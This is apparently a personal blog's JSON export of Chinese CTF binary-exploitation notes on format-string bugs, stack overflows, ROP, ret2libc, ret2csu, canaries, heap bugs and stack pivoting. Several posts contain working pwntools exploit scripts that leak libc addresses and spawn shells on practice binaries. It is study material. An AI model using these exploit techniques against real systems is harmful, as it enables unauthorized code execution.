{"meta":{"title":"huzai9527's personal blog","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[{"title":"Tags","date":"2020-06-30T12:29:17.407Z","updated":"2020-06-30T12:29:17.407Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PWN-格式化字符串原理","slug":"PWN-格式化字符串原理","date":"2020-12-12T05:25:02.000Z","updated":"2020-12-12T05:25:22.537Z","comments":true,"path":"2020/12/12/PWN-格式化字符串原理/","link":"","permalink":"http://yoursite.com/2020/12/12/PWN-格式化字符串原理/","excerpt":"","text":"格式化字符串原理1.format string print家族函数接受变长的字符串,其中第一个参数就是format string,后面的参数在实际运行中将与之对应 format string符号说明 %P 将对应的参数解析为地址形式输出 %K$P 对应格式化字符串后的第K个参数,并以地址形式输出 %K$n 与格式化字符串后的第K个参数对应,将参数解析为一个地址,并取消此次输出,而将已经输出的字节长度写入获取的地址 预调用约定 printf的参数按照参数的顺序依次存放在栈上的(32位) 对于64位机,前六个参数存放在相应的寄存器中 2.格式化字符串漏洞1.内存泄漏(%p) 当format string中的符号个数超过参数的个数时,printf会根据调用约定到,栈上(reg)中取值 因此当我们不向printf提供更多参数时,prinf会打印出栈上本不应该被访问的值 2.任意地址泄漏(%7$s) 类似这样的构造会造成栈上第 7+1 个参数,所在的地址被解析,读取该地址指向的字符串 3. 内存覆盖(%k$n) 需要清楚的是把什么值输出到哪里去?- 首先,写入的是%之前的字节数 其次写入的目的地是?- %n对当前偏移指向的那块空间存储的指针指向的空间写入数字,并取消此次输出 - 因此,写入的地址为,用户输入的地址des(当然,需要加偏移) - 比如说你输入了一个地址,此时会有一个地址(tmp)储存你输入的地址(des),而format string 作为一个参数,在函数栈中是有地址的,而由于格式化符号大于输入参数的个数,因此函数栈中会有很多的地址存储,因此需要通过偏移量找到用户输入的地址(des),并向des指向的空间写入%之前的字节数 实现任意地址写入 如何实现向任意地址写入任意字符串? 1payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;) 4.各种格式化字符含义%c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。 3.实例1.向got表中写入system的plt地址123456789101112131415from pwn import *p = process('./pwn5')elf = ELF('./pwn5')atoi_got = elf.got['atoi']system_plt = elf.plt['system']#这就是如何向任意地址空间写入任意数据payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)p.sendline(payload)p.sendline('/bin/sh\\x00')p.interactive() 2.向某个空间写入具体数据123456789from pwn import *#context.log_level = \"debug\"p = remote(\"node3.buuoj.cn\",26486)unk_804C044 = 0x0804C044payload=fmtstr_payload(10,&#123;unk_804C044:0x1111&#125;)p.sendlineafter(\"your name:\",payload)p.sendlineafter(\"your passwd\",str(0x1111))p.interactive()","categories":[],"tags":[{"name":"PWN CTF","slug":"PWN-CTF","permalink":"http://yoursite.com/tags/PWN-CTF/"}]},{"title":"PWN-缓冲区溢出原理","slug":"PWN-缓冲区溢出原理","date":"2020-12-12T04:47:05.000Z","updated":"2020-12-12T05:41:12.155Z","comments":true,"path":"2020/12/12/PWN-缓冲区溢出原理/","link":"","permalink":"http://yoursite.com/2020/12/12/PWN-缓冲区溢出原理/","excerpt":"","text":"缓冲区溢出原理1.程序内存布局 在程序运行的生命周期中,内存中比较重要的四部分数据是程序数据、堆、库数据、栈.此外内核空间也会映射到程序的内存中. 程序数据(Proc) 代码段(Text seg)- 主要存放可执行文件的代码指令,是可执行程序在内存中的镜像,代码段一般是只读的 数据段(Data seg) 存放可执行文件中已经初始化的变量,包括静态分配的变量和全局变量 BSS seg 包含程序中未初始化的全局变量,在内存中bss 段全部置0 堆(HEAP) 存放进程运行过程中动态申请的内存段.进程调用malloc、alloca、new等函数来申请内存,利用free、delete函数释放内存.这部分大小不固定,以方便程序灵活使用内存. 库数据(Memory Mapping) 存放映射的系统库文件,其中比较重要的是libc库,很多的程序所使用的系统函数都会动态的连接到libc库中 栈(Stack) 栈存放程序临时创建的局部变量.包括函数内部的临时变量和调用函数时压入的参数.由于 1. 函数调用栈 栈介绍 栈内存一般根据函数栈来进行划分,不同函数栈之间是相互隔离的,从而能够实现有效的函数切换 函数栈上存储的信息一般包括 临时变量 (canary) 函数的返回栈基址(bp) 函数的返回地址(ip) 函数栈的调用机制 程序运行时,为了实现函数之间的相互隔离,需要在进入新的函数之前保存当前函数的状态 函数调用时,首先将参数压入栈,然后压入返回地址和栈底指针寄存器bp,其中压入返回地址是通过call实现的 函数结束时,将sp重新指向bp位置,并弹出bp和返回地址==ip==,通常bp是通过leave或者(pop ebp实现的) 函数栈示意图 - 在函数栈中bp存储了上一个函数栈的基址,ip存储的是调用处的下一条指令的位置. - 返回当前函数时,会从栈上弹出这两个值,从而恢复上一个函数的信息 函数参数的传递 函数调用协议 _stdcall: wimdows API默认的函数调用协议 参数由由右向左入栈 调用函数结束后由被调用函数来平衡栈 _cdecl: c++/c默认的函数调用协议 参数由右向左入栈 函数调用结束后由函数调用者来平衡栈 _fastcall:适用于对性能要求较高的场合 从左开始将不大于4字节的参数放入CPU的ecx和edx寄存器,其余参数从右向左入栈 函数调用结束后,由被调用者来平衡栈 对于X86程序 普通函数传参:参数基本都压在栈上(也有寄存器传参的情况) syscall传参: eax对应系统调用号,ebx,ecx,edx,esi,edi,ebp分别对应前六个参数,多余的参数压在栈上 ==对于x86程序而言,参数传递是通过栈来实现的,在调用完以后,需要清除栈中参数,所以一般函数调用完之后需要用形如“pop;pop *;,,,,;ret;”的 gadget来调整.因为函数调用时返回地址会压入栈中,既汇编中的“call func”指令等同于“pop ret_addr;jump func”,因此在执行jmp func的时候,ret_addr已经压入栈中了== - 将ret_addr改成”pop*；ret“指令的gadget，用来弹出后续的args，即成为ROP的形式，这也是ROP的原理 ![](image-20201116160738116.png) 对于X64程序 普通函数传参:先使用rdi,rsi,rdx,r8,r9寄存器作为函数参数的前六个参数,多余的参数依次压在栈上 syscall传参:rax对应系统调用号,传参规则和普通函数一样 对于X64的程序来说，一般情况下，函数的参数较少，通常用寄存器来传递参数，所以在进入函数之前，因该先将寄存器设置好 函数运行时内存中的一段连续的区域,用来保存函数运行时的状态信息,包括参数与局部变量 涉及的寄存器 栈寄存器 esp: 用来存储函数调用栈的栈顶地址,在压栈和退栈时发生变化 ebp:用来存储当前函数状态的基地址,在函数运行时不变,可以用来索引函数参数或局部变量的位置 特殊寄存器 eip:用来存储即将执行的程序指令的地址,cpu按照eip的存储内容读取指令并执行,eip随之指向下一条指令,如此反复 Eflags:标识位寄存器 cs(code segment):储存代码段的地址 ds(data segment):储存数据段的地址 ss(stack segment):储存函数调用栈的地址 一般寄存器 eax(Accumulate):累加寄存器,用于进行算数运算,返回函数结果 ebx(Base):基址寄存器,在内存寻址时(比如数组运算),存放基地址 ecx(Count):计数寄存器,用以在循环中计数 edx(Data):数据寄存器,通常配合eax存放运算结果等数据 索引寄存器 esi(Souce Index):指向要处理数据的地址 edi(Destination Index): 指向存放数据结果的地址 涉及的汇编指令 MOV DST,SRC; (数据传输指令) 将src中的数据传输到dst中 PUSH SRC; (压入堆栈指令)将SRC压入栈 POP DST;(弹出堆栈指令) 弹出堆栈指令,将栈顶的数据弹出并保存至DST LEA REG,MEM; (取地址指令)将MEM的地址存在REG中 ADD/SUB DST,SRC;(加减指令) CALL PTR;(调用指令 )将当前的eip压入栈顶,并将PTR存入eip RET ;(返回指令)将栈顶数据弹出至eip 调用函数时,栈的变化(如何抛弃被调用函数的状态) 2.技术清单 覆盖缓冲区的具体用途 覆盖当前栈中函数的返回地址（当前函数或者之前的函数），获取控制流 覆盖栈中所存储的临时变量 覆盖栈底寄存器bp（之前的函数） 覆盖bp实现栈转移 这种情况主要针对“leave；ret”指令；该指令等价于“mov sp,bp;pop bp;ret” 覆盖bp，实现参数索引改变 一般来说，很多临时变量的索引，都是根据相对于bp的偏移量来进行的，如果bp发生了变化，那么后续的很多参数也会发生变化 关注敏感函数 background 控制指令执行最关键的寄存器就是eip,因此我们的==目标是让eip载入攻击指令的地址== 如何让eip指向攻击指令, list 修改返回地址,使其指向溢出数据中的一段指令==(shellcode)== 修改返回地址,使其指向内存中已有的某个函数==(return2libc==) 修改返回地址,使其指向内存中已有的某段指令==(ROP)== 修改某个被调用的函数的地址,让其指向另一个函数==(hijack GOT)== 1.Shellcode(关闭地址随机化以及有可执行权限) payload = padding1 + address of shellcode + padding2 + shellcode padding1 中的数据随便填充(⚠️如果是字符串输入,避免\\x00,可能会被截断),==长度应该刚好覆盖函数的基地址== ==问题一==:padding1因该多长? 可以通过调试工具(GDB)查看汇编代码来确定这个值==一般是lea指令+4== 也可以通过程序不断增加输入长度来试探(如果返回地址被无效地址如”AAA“覆盖)程序会报错 address of shellcode 是后面shellcode处的起始处的地址,==用来覆盖返回地址== ==问题二:==shellcode 的起始地址是多少? 可以通过调试工具查看返回值的地址(ebp中的内容+4, 32位机) 但是调试里的地址可能和正常运行时不一样,此时就可以通过在padding2中填充若干长度的==“\\x09”==,此机器码对应的指令是NOP(No Operation),既告诉cpu啥也不用做,然后跳到下一指令,有了NOP的填充,只要返回地址能够命中这一段中的任一位置,都可以跳转到shellcode的起始处 padding2可以随意填充,长度任意. shellcode因该是16进制机器码的格式 实例123456789101112131415from pwn import *from LibcSearcher import *sh = remote('node3.buuoj.cn',29955)elf = ELF('./ciscn_2019_n_5')#这句话非常重要,因为设置arch决定了👇shell的汇编结果,不同arch下得到的结果是不一样的context.arch = elf.archcontext.log_level = 'debug'bss_addr = 0x601080shellcode = asm(shellcraft.sh())#生成64位linuxshellcodepayload = b'a'*0x20 + b'a'*8 + p64(0x601080)#栈溢出ret到shellcode执行sh.sendlineafter(\"name\\n\",shellcode)sh.sendlineafter(\"me?\\n\",payload)sh.interactive() 2.return2libc–指向内存中的函数(操作系统关闭ASLR) 获取libc中的system函数的地址,使用gdb,给main函数打上断点,然后使用 1p system 该方法可以获取任意libc函数的地址 设置system函数返回后的地址,以及为system函数构造我们预定的参数 由于我们使用system的函数地址替换了原本的ip寄存器,强制执行了system函数.破坏了原程序栈桢分配和释放策略,所以后续的操作必须基于这个被破坏的栈桢结构来实现 例如下面的payload中的padding2的操作应该是pop ip,也就是system函数调用完成后需要返回的地址 为什么呢? 因为在正常情况下,函数是通过call进行调用的,因此在进入system前,call指令已经通过push ip将返回地址push到函数调用栈中,所以在正常情况下ret指令pop到ip的数据就是call指令push到栈中的数据,也就是说两者是成对出现的 但是!!!!由于我们是直接通过覆盖ip的地址从而跳转到system函数,并没有经过call指令的调用,也就是并没有push ip的操作,但是system函数却照常执行了ret指令的pop ip的操作. 因此,ret 指令pop到ip中的到底是哪一处的数据呢,答案就是padding2中的数据,也就是我们自己设定的system函数的返回地址 知道了system部分的payload,那么如何获得system的地址以及bin/sh的地址呢? 可以通过puts与gets函数,gets造成溢出,puts泄漏libc中的system以及/bin/sh的地址 bin在so文件中的地址 1strings -t x libc.so | grep bin 可执行的system(“/bin/sh”)在so文件中的地址 1one_gadget libc.so 由于我们可以控制栈,根据rop的思想,我们需要找到的就是pop rdi;ret 前半段用于给第一个参数rdi赋值,后半段用于跳到其他代码片段 如何找到可以赋值的参数呢? 可以通过,ROPgadget,这里的值通常是固定的0x400833 1ROPgadget --binary file_name --only \"pop|ret\" | grep rdi 因此我们可以构造payload泄漏出puts函数的真实地址 有了真实地址,我们还需要知道程序使用的libc,算出libc的基址 这里可以使用LibcSearcher 1234from LibcSearcher import *#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型obj = LibcSearcher(\"fgets\", 0X7ff39014bd90) 知道了程序使用的libc,以及puts函数的真实地址,我们就可算出libc的基址,再通过基址加偏移就能得到函数的真实地址 12345libc_base = 0X7ff39014bd90 - obj.dump(\"fgets\")obj.dump(\"system\") #system 偏移obj.dump(\"str_bin_sh\") #/bin/sh 偏移#system的真实地址system_addr =libc_base + obj.dump(\"system\") 这里有可能会遇到,匹配不到libc的错误,可以通过libc-database,添加libc 123456./get # List categories./get ubuntu debian # Download Ubuntu's and Debian's libc, old default behavior./get all # Download all categories. Can take a while!#或者添加自身的libc./add /usr/lib/libc-2.21.so 实例 64位 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *context.log_level = 'debug'#p = remote('node3.buuoj.cn',25805)p = process('./ciscn_2019_c_1')elf = ELF('ciscn_2019_c_1')puts_got = elf.got['puts']puts_plt = elf.plt['puts']pop_rdi = 0x400c83main_addr = 0x400b28p.recvuntil('!\\n')p.sendline('1')payload = b'\\x00'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)print(\"payload=====&gt;\"+str(payload))p.recvuntil('ed\\n')p.sendline(payload)p.recvuntil('\\n\\n')puts_real_addr = u64(p.recvuntil('\\n', drop=True).ljust(8, b'\\x00'))print('puts real addr ====&gt;'+str(hex(puts_real_addr)))libc = LibcSearcher('puts',puts_real_addr)libc_base = puts_real_addr - libc.dump('puts')print('libc_base====&gt;'+str(libc_base))system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')print(\"system ====&gt;\"+str(hex(system)))print(\"bin_sh ====&gt;\"+str(hex(bin_sh)))ret = 0x4006b9payload2 = b'\\x00'*0x58 +p64(ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system) p.recv()p.sendline('1')p.recv()p.sendline(payload2)p.interactive() 32位 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from LibcSearcher import *context.log_level = 'debug'r=remote('node3.buuoj.cn',28001)#r=process('./pwn')elf=ELF('./pwn')write_plt=elf.plt['write']read_got=elf.got['read']read_plt=elf.plt['read']main_addr=0x8048825#溢出控制返回值v5payload1=b'\\x00'+b'a'*6+b'\\xff'r.sendline(payload1)r.recvuntil('Correct\\n')#泄漏libcpayload=b'a'*0xebpayload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(4)r.sendline(payload)read_addr=u32(r.recv(4))print('[+]read_addr: ',hex(read_addr))#计算libc_base，system_addr，bin_sh_addrlibc=LibcSearcher('read',read_addr)libc_base=read_addr-libc.dump('read')system_addr=libc_base+libc.dump('system')bin_sh_addr=libc_base+libc.dump('str_bin_sh')#执行payloadr.sendline(payload1)r.recvuntil('Correct\\n')payload=b'a'*0xe7+b'b'*0x4payload+=p32(system_addr)*2+p32(bin_sh_addr)r.sendline(payload)r.interactive() payload = padding1 + address of system() + padding2 + address of “/bin/sh” Padding1 随意填充,==长度刚好覆盖基地址== 长度与shellcode处的一样的方法 address of system() 是system在内存中的地址,==用来覆盖返回地址== system()函数地址在哪里? 从动态库中获取,计算绝对地址 padding2 数据长度应该为 ==4== (32位机) 由于不关心退出shell后的行为,可随意填 ⚠️当需要多次绕过时,这里应该填充system执行后需要返回的地址,否则程序栈会崩溃 address of ”/bin/sh“ 是字符串在内存中的地址,作为传给system的参数 字符串哪里找? 动态库搜索,计算绝对地址 没有就将其加入环境变量,通过getenv()函数获取 3.ROP(开启NX时可用)–指向内存中已有的某段指令 payload = padding + address of gadget ​ ROP的常见拼凑效果是实现一次系统调用 如何寻找指令片段? 使用工具寻找以ret结尾的片段 如何寻找系统调用的参数? 可以使用pop指令将栈顶数据存入寄存器 如果内存中有可以用move指令进行传输 对于单个gadget,pop所传输的数据因该在gadget地址之后 具体的ROP例子 适用于题目中没有给出任何有关cat flag有关信息,并且题目中也没有任何与system有关的函数 此时需要我们leak除libc函数的地址,再通过libc构造ROP 3.2 中级ROP ret2_libc_csu_init 在64位程序中，函数的前六个参数是通过寄存器传参的，但是大多数时候，我们很难找到每个寄存器对应的gadgets，这个时候我们可以用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的 123456789101112131415161718192021222324252627282930313233343536373839404142.text:00000000004005C0 ; void _libc_csu_init(void).text:00000000004005C0 public __libc_csu_init.text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o.text:00000000004005C0 push r15.text:00000000004005C2 push r14.text:00000000004005C4 mov r15d, edi.text:00000000004005C7 push r13.text:00000000004005C9 push r12.text:00000000004005CB lea r12, __frame_dummy_init_array_entry.text:00000000004005D2 push rbp.text:00000000004005D3 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004005DA push rbx.text:00000000004005DB mov r14, rsi.text:00000000004005DE mov r13, rdx.text:00000000004005E1 sub rbp, r12.text:00000000004005E4 sub rsp, 8.text:00000000004005E8 sar rbp, 3.text:00000000004005EC call _init_proc.text:00000000004005F1 test rbp, rbp.text:00000000004005F4 jz short loc_400616.text:00000000004005F6 xor ebx, ebx.text:00000000004005F8 nop dword ptr [rax+rax+00000000h].text:0000000000400600.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 __libc_csu_init endp 这里如果巧妙的控制==rbx==与==r12==,我们就可以调用我们想要调用的函数.例如设置rbx=0,r12位存储我们想要调用的函数的地址. 实例123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *io = process(\"./ciscn_s_3\")context.log_level = 'debug'vul_addr = 0x4004edmain_addr = 0x40051dpop_rdi_ret = 0x4005a3csu_front_addr = 0x40059Acsu_end_addr = 0x400580ret_addr = 0x400519sys_call = 0x400517mov_rax_59 = 0x4004E2payload1 = b'/bin/sh\\x00'*2 + p64(vul_addr)#gdb.attach(io)#pause()io.send(payload1)io.recv(0x20)leak_addr = u64(io.recv(8))#泄露出来argv的地址log.info('leaked_addr===&gt;'+hex(leak_addr))#print(\"----------&gt;\",hex(leak_addr - 0x118))#gdb.attach(io)#pause()bin_sh = leak_addr - 0x128#用偏移通过argv找到binsh地址payload = b'/bin/sh\\x00'*2 + p64(mov_rax_59) + p64(csu_front_addr)#ebp处放给寄存器rax赋值的地址payload += p64(0) + p64(1) + p64(bin_sh+0x10) + p64(0) + p64(0) + p64(0)#这里就是巧妙的执行利用，rbx 与 r12执行了mov_rax_59的操作#bin_sh+0x10的位置放得是执行mov rax 59 地址的地址，也就是rbp此时指向的地址#后面的三个0是给execv函数传参，/bin/sh在4字节的edi中放不下，所以这里我们先传0，下面再pop_rdipayload += p64(csu_end_addr)payload += 0x38*b'A'payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)#寄存器被赋值之后执行syscall，它会自动匹配要执行execv，然后回去64位对应的寄存器里面找参数io.send(payload)io.interactive() 可以利用的csu 用gdb+pwn 进行动态调试,得到函数栈中的状态与payload的对应关系,如下 4.hijiack got – 修改某个被调用函数的地址,让其指向另一个地址 动态链接与静态链接 静态链接 把需要调用的函数或者过程链接到可执行文件中,成为可执行文件的一部分,使得文件包含运行时的全部代码,当多个程序调用相同函数时,内存中就会出现多个这个函数的拷贝,浪费内存 动态链接 仅仅在调用处加入了所调用函数的描述信息(往往是一些重定位信息),当程序运行时,才回去动态的链接到相应的函数,动态链接库的文件后缀为.so GOT与PLT GOT(global offset table) 全局偏移量表,用来储存外部函数在内存的确切地址 PLT(procedure linkage table) 程序链接表,用来存储外部函数的入口点 第一次调用函数时解析函数地址并存入GOT表 第二次调用函数直接读取GOT中的地址 整个调用的过程 如何确定函数A在GOT表中的位置? 程序调用函数是通过PLT表跳转到GOT表的对应条目,在汇编指令中找到该函数在PLT中的入口点位置,从而定位到该函数在GOT中 的条目 如何确定函数B在内存中的位置? 函数在动态链接库中的位置是相对固定的.如果知道了函数A的运行地址(读取GOT表中的内容),也知道A和B在动态链接库中的相对位置,就可一推断出B的运行时地址 如何实现GOT表中的数据修改? 格式化字符串漏洞 5.Return-to-dl_resolve 核心思想是利用dl_runtime_resolve函数解析出system函数的地址,通常在没有提供lib函库的情况下使用. 使用条件 未给出libc库 没有开启PIE保护,如果开启PIE需要通过泄漏获取基地址 没有开启FULL RELOAD 3. payload与函数调用栈的关系 payload的长度可以用 payload.ljust(0x105,b’a’)进行填充,使得填充后的payload的总长度为0x106 Bytes ⚠️p32(0xdeadbeef) 占4个Byte paylaod的实际意义是通过输入的溢出,将我们需要的指令送到ip让cpu执行 下图是64位,中的对应关系 ​ 经过gdb+pwn调试，得到正确的关系，main实际上是返回值 ​ 下图是32位中的对应关系 4.通用的gadget__libc_csu_init() 在程序编译的过程中,会自动加入一些通用函数的初始化工作,这些初始化函数都是相同的,因此可以考虑在这些函数中找到一些通用的gadget 需要关注的寄存器 r12 保存着将要调用函数的指针的地址 rcx r8 r9 第四五六个参数 rdx 第三个参数 rsi 第二个参数 rdi 第一个参数 rbx 和 rbp 的值分别为0 1 5.Canary linux中的cookies,用来检测溢出并阻止溢出操作 其原理是当程序启用canary编译后,在函数序言部分会取fs寄存器0x20处的值.存放在栈中 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp-8], rax 在函数返回之前,会将该值取出,并与fs:0x28的值进行亦或.这个操作既检测是否发生栈溢出 如果canary已经被非法修改,此时程序流程会走到__stack_chk_fail 通过格式化字符串绕过canary 由于格式化字符串漏洞会导致任意地址泄漏,因此,只要得到输入参数在栈中的位置,就可以通过偏移得到canary在栈中的位置 然后在栈溢出的padding块把canary所在的位置的值用正确的canary替换,从而绕过canary检测","categories":[],"tags":[{"name":"PWN CTF","slug":"PWN-CTF","permalink":"http://yoursite.com/tags/PWN-CTF/"}]},{"title":"PWN-堆相关的漏洞","slug":"PWN-堆相关的漏洞","date":"2020-12-12T04:30:57.000Z","updated":"2020-12-12T05:25:31.509Z","comments":true,"path":"2020/12/12/PWN-堆相关的漏洞/","link":"","permalink":"http://yoursite.com/2020/12/12/PWN-堆相关的漏洞/","excerpt":"","text":"堆相关的漏洞1.堆介绍 结构示意图 N位：define NON_MAIN_ARENA 用于表示是否属于主线程，0表示主线程的堆块结构，1表示子线程的堆块结构 M位：define IS_MAPPED 0X2 用于表示是否由mmap分配，0表示由堆块中的top chunk分裂产生，1表示由mmap分配 P位：define PREV_ISUSE 0x1 用于表示上一堆块是否处于空闲状态，0表示处于空闲状态，1表示处于使用状态。主要用于来判断free是否能够上一堆块进行合并 堆空闲块管理结构bin 当allocated chunk被释放以后，会放入bin或者top chunk中去。bin的作用是加快分配速度，其通过链表方式（chunk结构体中的fd和bk指针）进行管理 fast bin 单链表结构进行组织，用fd指针指向下一堆块，采用LIFO机制 它将堆块的p标志为都设为1，处于占用状态，以防止释放时fast bin进行合并，用于快速分配小内存 malloc基本规则 将申请size按照一定的规则对齐，得到最终要分配的大小size_real X86:size+4 按照0x10字节对齐 X64：size+8按照0x20字节对齐 检查size_real 是否符合fast bin 的大小，若是则查看fast bin中对应的size_real 的那条链表中是否存在堆块，若是则分配，否则进行下一步 检查size-real 是否符合small bin 的大小，若是则查看fast bin中对应的size_real 的那条链表中是否存在堆块，若是则分配，否则进行下一步 检查size-real 是否符合large bin 的大小，若是则调用malloc_consolidate函数对fast bin中所有堆块进行合并，其过程为将fast bin中的堆块取出，清除下一块的p标识位并进行堆块合并，将最终的堆块放入unsorted bin。然后在small bin 和large bin中找到合适size_real大小的块。若找到则分配，并将多余的部分放入unsorted bin ，否则下一步 检查top chunk的大小是否符合size_real的大小，若是则分配前面一部分，并重新设置top chunk，否则调用malloc_consolidate函数对fast bin中所有的堆块进行合并，若依然不否，则借助系统调用来开辟新的空间进行分配，若还是不满足，则返回失败 free 基本规则 首先会检查地址是否对齐,并根据size找到下一块的位置,检查其p标识位是否为1 检查释放块的size是否符合fastbin的大小区间,若是则直接放入fast bin,并保持下一堆块中的p标识位为1不变(这样可以避免在前后块释放时进行堆块的合并,以方便快速分配小内存),否则进行下一步 若本堆块size域中的p标识位为0(前一堆块处于释放状态)则利用本快的pre_size找到前一堆块的开头,将其从bin链表中摘除(unlink),并合并这两个块,得到新的释放块 根据size找到下一堆块,如果是top chunk,则直接合并到top chunk中,直接返回.否则检查最后一堆块是否处于释放状态(通过检查下一堆块的p标识位是否为0).将其从bin链表中摘除(unlink),并合并这两块,得到新的释放块. 将上述合并得到的最终堆块放入unstorted bin中去 tcache 作用 提高堆的使用效率 注意点 tcache的管理是单链表,采用LIFO原则 tcache的管理结构存在于堆中,默认有64个entry,每个entry最多存放7个chunk tcache的next指针指向chunk的数据区 tcache的某个entry被占满以后,符合该entry大小的chunk被free后的规则和原有机制相同 2. 相关的数据结构微观结构malloc_chunk结构 1234567891011121314151617/* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; Bin ptmalloc 根据chunk的大小以及使用状态将chunk分为4类:fast bin, small bin, large bin, unstorted bin 一个bin相当于一个chunk链表 fast bin 采用LIFO策略,支持的最大的chunk的数据空间大小为64字节,最大支持的bin的个数位10,inuse位始终置为1,防止被合并 small bins中每个chunk的大小与其所在bin的index的关系为:chunk_size = 2*size_sz*index Top Chunk程序第一次进行malloc的时候,heap会被分成两块,一块给用户,剩下的那块就是Top Chunk(处于当前堆的物理地址最高的chunk,不属于任何bin),它的作用是在当前所有bin都无法满足用户的请求大小时,如果其满足大小,就进行分配,将剩下的部分作为新的TopChunk.否则对heap进行扩展后再进行分配. 宏观结构heap_info​ 程序刚开始执行时是没有heap区域的,当其申请内存时,就需要一个结构记录对应的信息,而且一般当前的heap资源被用完后,重新申请的heap一般是不连续的,因此需要记录不同heap之间连接结构,而heap的作用就是这个 malloc_state该结构用于管理堆,记录每个arena当前申请内存的具体状态,比如是否有空闲的chunk等,他是一全局变量存储在libc.so中 3.深入理解堆的实现宏观角度 - 创建堆 - 堆初始化 - 删除堆 微观角度 申请内存块 释放内存块 3.相关的漏洞1. 最基本的堆漏洞 由于对堆内容类型判断不明而形成的错误引用,通常情况下,可以使用堆块存储复杂的结构体,其中可能会包括函数指针、变量、数组等成员.如果一个结构体数据按照其他结构体格式来解析,那么只要在特定的域布置好数据,就会导致漏洞的发生. 2.堆缓冲区溢出 常规溢出 堆缓冲区溢出与栈缓冲区溢出类似 Off By One 只能溢出一子节,通常位于堆块末尾,溢出的1子节恰好能够覆盖下一堆块的size域的最低位,难以利用,一般有固定的套路 Use After Free 若堆指针在释放后未被置空,形成悬挂指针(野指针),当下次访问该指针时,依然能够访问到原始指针指向的堆内容 申请一段空间,并将其释放,释放后并不将指针置为空,因此这个指针仍然可以使用,把这个指针简称为p1 申请空间p2,由于malloc分配过程使得p2指向的空间为刚刚释放的p1指针的空间,构造恶意数据将这段内存空间布局好,既覆盖p1中的数据 可利用p1,一般多有一个函数指针,由于之前已经使用P2将P1中的数据覆盖了,所以此时的数据即是我们可以控制的,既存在劫持函数流的情况 Doubble Free 对指针进行多次释放.多次释放会使堆块发生重叠,前后申请的堆块可能会指向同一块内存","categories":[],"tags":[{"name":"PWN CTF","slug":"PWN-CTF","permalink":"http://yoursite.com/tags/PWN-CTF/"}]},{"title":"PWN-堆栈平衡","slug":"PWN-堆栈平衡","date":"2020-12-12T04:23:21.000Z","updated":"2020-12-12T04:29:53.847Z","comments":true,"path":"2020/12/12/PWN-堆栈平衡/","link":"","permalink":"http://yoursite.com/2020/12/12/PWN-堆栈平衡/","excerpt":"","text":"堆栈平衡和栈转移1.栈平衡1.为什么需要堆栈平衡? 保持栈的大小,是ESP始终指向栈顶 2.概念 函数如果要返回父程序,则在堆栈中进行操作时,一定要在RET指令之前,将ESP指向函数压入栈中时的地址 如果通过堆栈传递参数了,那么在函数执行完毕后,要平衡参数导致的堆栈变化 3.总结 当函数在栈中操作时,需要先把ESP交给EBP,然后继续操作,当操作完成后,在ret之前,要先将ESP恢复成进入栈之前的状态,最后再将EBP移除栈 2.栈转移1.为什么需要栈转移? 在栈空间不够存放payload的情况下,需要一个新的地址空间存放payload 开启PIE保护,栈地址未知,我们可以将栈劫持到已知的区域 2.概念 劫持栈的rsp(ESP),使其指向其他位置,形成一个伪造的栈,在此栈中做ROP 3.必要的gadget pop ebp;ret 释放EBP,并连接伪造的栈 leave;ret 更改ESP,指向后续的payload 4.原理 通过 pop ebp;ret + 